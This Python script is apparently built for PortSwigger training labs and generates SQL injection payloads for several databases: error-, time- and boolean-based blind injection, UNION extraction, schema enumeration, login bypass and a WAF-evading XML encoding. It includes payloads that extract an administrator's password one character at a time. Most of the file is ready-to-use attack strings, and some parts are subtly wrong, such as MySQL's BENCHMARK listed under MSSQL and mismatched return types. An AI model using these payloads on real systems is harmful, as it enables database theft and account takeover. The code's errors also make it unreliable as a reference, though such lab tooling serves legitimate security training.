#!/usr/bin/env python3
"""
Advanced SQL Injection Exploits - Based on PortSwigger Labs
All major blind SQLi techniques with payload generation

Supported Techniques:
1. Conditional Errors (500 = vulnerable)
2. Conditional Responses (keyword = vulnerable)
3. Time-Based Blind (delay = vulnerable)
4. UNION-based extraction
5. Boolean-based blind
6. XML encoding bypass
7. Login bypass (comment injection)
8. Database enumeration
"""

from enum import Enum
from typing import List, Dict, Any, Tuple
import re


class SQLiTechnique(Enum):
    """SQL Injection Techniques"""
    CONDITIONAL_ERROR = "conditional_error"
    CONDITIONAL_RESPONSE = "conditional_response"
    TIME_BASED_BLIND = "time_based_blind"
    UNION_BASED = "union_based"
    BOOLEAN_BLIND = "boolean_blind"
    ERROR_BASED = "error_based"
    XML_ENCODING_BYPASS = "xml_encoding_bypass"
    LOGIN_BYPASS = "login_bypass"


class DatabaseType(Enum):
    """Supported Database Types"""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    ORACLE = "oracle"
    MSSQL = "mssql"
    SQLITE = "sqlite"
    UNKNOWN = "unknown"


class BlindSQLiPayloads:
    """Payload generator for all blind SQLi techniques"""
    
    @staticmethod
    def conditional_errors(db_type: DatabaseType) -> Dict[str, List[str]]:
        """Payloads that cause SQL errors on TRUE condition"""
        payloads = {
            DatabaseType.ORACLE: [
                # TRUE condition causes error
                "'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END)||'",
                "'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual)||'",
            ],
            DatabaseType.POSTGRESQL: [
                "'||(SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)||'",
                "'||(SELECT CASE WHEN (1=1) THEN 1/CAST(0 AS INTEGER) ELSE NULL END)||'",
            ],
            DatabaseType.MYSQL: [
                "' AND extractvalue(0x0a, CONCAT(0x7e, (SELECT 1)))--",
                "' AND updatexml(0, CONCAT(0x7e, (SELECT 1)), 0)--",
            ],
            DatabaseType.MSSQL: [
                "' AND 1=CAST(1.0/0 AS INT)--",
                "' AND 1=CONVERT(INT, 1/0)--",
            ],
        }
        return payloads.get(db_type, payloads[DatabaseType.POSTGRESQL])
    
    @staticmethod
    def time_delays(db_type: DatabaseType, seconds: int = 5) -> Dict[str, List[str]]:
        """Payloads that cause time delays"""
        payloads = {
            DatabaseType.POSTGRESQL: [
                f"'||(SELECT pg_sleep({seconds}))||'",
                f"'; SELECT pg_sleep({seconds}); --",
            ],
            DatabaseType.MYSQL: [
                f"' AND SLEEP({seconds})--",
                f"' AND SELECT SLEEP({seconds})--",
            ],
            DatabaseType.ORACLE: [
                f"'||(SELECT DBMS_LOCK.SLEEP({seconds}))||'",
                f"' AND DBMS_LOCK.SLEEP({seconds})--",
            ],
            DatabaseType.MSSQL: [
                f"' AND WAITFOR DELAY '00:00:{seconds:02d}'--",
                f"' AND BENCHMARK({seconds*1000000}, MD5('x'))--",
            ],
        }
        return payloads.get(db_type, payloads[DatabaseType.POSTGRESQL])
    
    @staticmethod
    def boolean_blind() -> List[str]:
        """Payloads for boolean-based blind SQLi"""
        return [
            # TRUE conditions
            "' AND 1=1--",
            "' AND '1'='1",
            "' OR 1=1--",
            
            # FALSE conditions  
            "' AND 1=2--",
            "' AND '1'='2",
            "' OR 1=2--",
        ]
    
    @staticmethod
    def union_based(num_columns: int, db_type: DatabaseType = DatabaseType.POSTGRESQL) -> List[str]:
        """UNION-based injection payloads"""
        nulls = ','.join(['NULL'] * num_columns)
        payloads = [
            f"' UNION SELECT {nulls}--",
            f"' UNION ALL SELECT {nulls}--",
            f"') UNION SELECT {nulls}--",
            f"')) UNION SELECT {nulls}--",
        ]
        return payloads
    
    @staticmethod
    def database_enumeration(db_type: DatabaseType) -> Dict[str, str]:
        """Payloads for database enumeration"""
        queries = {
            DatabaseType.POSTGRESQL: {
                'tables': "' UNION SELECT table_name, null FROM information_schema.tables--",
                'columns': "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--",
                'version': "' UNION SELECT version(), null--",
            },
            DatabaseType.MYSQL: {
                'tables': "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()--",
                'columns': "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--",
                'version': "' UNION SELECT @@version, null--",
            },
            DatabaseType.ORACLE: {
                'tables': "' UNION SELECT table_name, null FROM all_tables--",
                'columns': "' UNION SELECT column_name, null FROM all_tab_columns WHERE table_name='USERS'--",
                'version': "' UNION SELECT banner, null FROM v$version--",
            },
        }
        return queries.get(db_type, queries[DatabaseType.POSTGRESQL])
    
    @staticmethod
    def xml_encoding_bypass() -> str:
        """XML-encoded payload to bypass WAF"""
        # "1 OR 1=1"
        return "&#49;&#32;&#79;&#82;&#32;&#49;&#61;&#49;"
    
    @staticmethod
    def login_bypass() -> List[str]:
        """Payloads for login bypass"""
        return [
            "' OR '1'='1' --",
            "' OR 1=1--",
            "admin' --",
            "' --",
            "' /*",
            "admin' /*",
            "' or 1=1 -- -",
            "' or 1=1 ;--",
        ]
    
    @staticmethod
    def parameter_extraction(db_type: DatabaseType, param_name: str, table: str = 'users', 
                            column: str = 'password', username: str = 'administrator') -> List[str]:
        """Payloads to extract specific parameter"""
        
        if db_type == DatabaseType.POSTGRESQL:
            return [
                f"'||(SELECT CASE WHEN (LENGTH({column})=10) THEN pg_sleep(5) ELSE null END FROM {table} WHERE username='{username}')||'",
                f"'||(SELECT CASE WHEN (SUBSTR({column},1,1)='a') THEN pg_sleep(5) ELSE null END FROM {table} WHERE username='{username}')||'",
            ]
        elif db_type == DatabaseType.ORACLE:
            return [
                f"'||(SELECT CASE WHEN (LENGTH({column})=10) THEN to_char(1/0) ELSE NULL END FROM {table} WHERE username='{username}')||'",
            ]
        elif db_type == DatabaseType.MYSQL:
            return [
                f"' AND (SELECT LENGTH({column}) FROM {table} WHERE username='{username}')=10--",
                f"' AND (SELECT SUBSTRING({column},1,1) FROM {table} WHERE username='{username}')='a'--",
            ]
        
        return []


class PortSwiggerLabConfig:
    """Configuration for PortSwigger lab scenarios"""
    
    LABS = {
        'conditional_errors': {
            'db': DatabaseType.ORACLE,
            'technique': SQLiTechnique.CONDITIONAL_ERROR,
            'cookie': 'TrackingId',
            'url_param': 'category',
        },
        'conditional_responses': {
            'db': DatabaseType.POSTGRESQL,
            'technique': SQLiTechnique.CONDITIONAL_RESPONSE,
            'cookie': 'TrackingId',
            'url_param': 'category',
            'detection_keyword': 'Welcome back!',
        },
        'time_delays': {
            'db': DatabaseType.POSTGRESQL,
            'technique': SQLiTechnique.TIME_BASED_BLIND,
            'cookie': 'TrackingId',
            'url_param': 'category',
            'delay_threshold': 5,
        },
        'union_based': {
            'db': DatabaseType.POSTGRESQL,
            'technique': SQLiTechnique.UNION_BASED,
            'url_param': 'category',
            'num_columns': 2,
        },
        'login_bypass': {
            'db': DatabaseType.POSTGRESQL,
            'technique': SQLiTechnique.LOGIN_BYPASS,
            'url_param': ['username', 'password'],
        },
        'xml_encoding_bypass': {
            'db': DatabaseType.POSTGRESQL,
            'technique': SQLiTechnique.XML_ENCODING_BYPASS,
            'content_type': 'application/xml',
            'xml_param': 'storeId',
        },
    }


class BlindSQLiDetector:
    """Detect and classify blind SQLi vulnerability"""
    
    @staticmethod
    def detect_technique(response_true: str, response_false: str, 
                         response_time_true: float, response_time_false: float,
                         status_code_true: int, status_code_false: int) -> List[SQLiTechnique]:
        """
        Detect which blind SQLi technique is vulnerable
        
        Returns: List of detected techniques (in order of likelihood)
        """
        techniques = []
        
        # Check for conditional errors
        if status_code_true >= 500 and status_code_false < 500:
            techniques.append(SQLiTechnique.CONDITIONAL_ERROR)
        
        # Check for conditional responses
        response_diff = abs(len(response_true) - len(response_false))
        if response_diff > 100:  # Significant difference
            techniques.append(SQLiTechnique.CONDITIONAL_RESPONSE)
        
        # Check for time-based blind
        time_diff = response_time_true - response_time_false
        if time_diff > 3:  # At least 3 seconds difference
            techniques.append(SQLiTechnique.TIME_BASED_BLIND)
        
        # Check for boolean-based
        if response_true != response_false and response_diff < 50:
            techniques.append(SQLiTechnique.BOOLEAN_BLIND)
        
        return techniques
    
    @staticmethod
    def generate_report(techniques: List[SQLiTechnique]) -> str:
        """Generate vulnerability report"""
        report = "=== Blind SQL Injection Detection Report ===\n\n"
        report += f"Detected Techniques ({len(techniques)}):\n"
        
        for i, tech in enumerate(techniques, 1):
            report += f"  {i}. {tech.value.replace('_', ' ').title()}\n"
        
        if techniques:
            report += f"\nMost likely: {techniques[0].value}\n"
        
        return report


class ExploitStrategy:
    """Strategy for exploiting detected blind SQLi"""
    
    def __init__(self, technique: SQLiTechnique, db_type: DatabaseType):
        self.technique = technique
        self.db_type = db_type
    
    def extract_password_length(self, table: str = 'users', 
                                username: str = 'administrator') -> str:
        """Generate payload to extract password length"""
        
        if self.technique == SQLiTechnique.TIME_BASED_BLIND:
            payloads = BlindSQLiPayloads.parameter_extraction(
                self.db_type, 'password_length', table, 'password', username
            )
            return payloads[0] if payloads else ""
        
        elif self.technique == SQLiTechnique.CONDITIONAL_ERROR:
            if self.db_type == DatabaseType.ORACLE:
                return f"'||(SELECT CASE WHEN (LENGTH(password)=10) THEN to_char(1/0) ELSE NULL END FROM {table} WHERE username='{username}')||'"
        
        elif self.technique == SQLiTechnique.CONDITIONAL_RESPONSE:
            if self.db_type == DatabaseType.POSTGRESQL:
                return f"' AND (SELECT username FROM {table} WHERE username='{username}' AND LENGTH(password)=10)='{username}'--"
        
        return ""
    
    def extract_character(self, position: int, char_code: int, 
                         table: str = 'users', username: str = 'administrator') -> str:
        """Generate payload to extract single character by position"""
        
        if self.technique == SQLiTechnique.TIME_BASED_BLIND:
            if self.db_type == DatabaseType.POSTGRESQL:
                return f"'||(SELECT pg_sleep(5) FROM {table} WHERE username='{username}' AND SUBSTR(password,{position},1)=CHR({char_code}))||'"
        
        elif self.technique == SQLiTechnique.CONDITIONAL_ERROR:
            if self.db_type == DatabaseType.ORACLE:
                return f"'||(SELECT CASE WHEN (SUBSTR(password,{position},1)=CHR({char_code})) THEN to_char(1/0) ELSE NULL END FROM {table} WHERE username='{username}')||'"
        
        return ""


def generate_lab_exploits() -> Dict[str, Dict[str, Any]]:
    """Generate exploits for all PortSwigger labs"""
    
    exploits = {}
    
    for lab_name, config in PortSwiggerLabConfig.LABS.items():
        payload_gen = BlindSQLiPayloads()
        
        db_type = config['db']
        technique = config['technique']
        
        if technique == SQLiTechnique.CONDITIONAL_ERROR:
            payloads = payload_gen.conditional_errors(db_type)
        elif technique == SQLiTechnique.TIME_BASED_BLIND:
            payloads = payload_gen.time_delays(db_type, seconds=5)
        elif technique == SQLiTechnique.BOOLEAN_BLIND:
            payloads = payload_gen.boolean_blind()
        elif technique == SQLiTechnique.LOGIN_BYPASS:
            payloads = payload_gen.login_bypass()
        elif technique == SQLiTechnique.XML_ENCODING_BYPASS:
            payloads = payload_gen.xml_encoding_bypass()
        else:
            payloads = []
        
        exploits[lab_name] = {
            'technique': technique.value,
            'database': db_type.value,
            'payloads': payloads,
            'config': config,
        }
    
    return exploits


if __name__ == '__main__':
    print("üîç Blind SQL Injection Payload Generator\n")
    print("=" * 60)
    
    # Generate all lab exploits
    labs = generate_lab_exploits()
    
    for lab_name, exploit_info in labs.items():
        print(f"\nüìã Lab: {lab_name}")
        print(f"   Technique: {exploit_info['technique']}")
        print(f"   Database: {exploit_info['database']}")
        
        if isinstance(exploit_info['payloads'], list):
            print(f"   Payloads ({len(exploit_info['payloads'])}):")
            for i, payload in enumerate(exploit_info['payloads'][:2], 1):
                print(f"     {i}. {payload[:70]}...")
        elif isinstance(exploit_info['payloads'], str):
            print(f"   Payload: {exploit_info['payloads'][:70]}...")
    
    print("\n" + "=" * 60)
    print("\n‚úÖ Exploit strategies ready for integration into SQLiExploit")
